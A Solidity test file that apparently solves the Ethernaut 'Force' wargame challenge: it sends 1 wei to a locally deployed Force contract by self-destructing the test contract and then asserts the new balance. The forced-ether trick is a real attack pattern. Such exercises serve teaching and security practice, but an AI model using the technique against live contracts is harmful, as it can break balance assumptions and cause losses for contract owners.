// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../contracts/7Force.sol";
import "../contracts/utils/TestWithSetup.sol";

contract ForceAttack is TestWithSetup{

    Force private challengeContract;

    constructor(){
        challengeContract = new Force();
    }

    function testAttack() public {
        // contract gets 1 wei

        vm.deal(address(this), 1);
        assertEq(address(challengeContract).balance, 0);
        selfdestruct(payable(address(challengeContract)));
        assertEq(address(challengeContract).balance, 1);

    }
}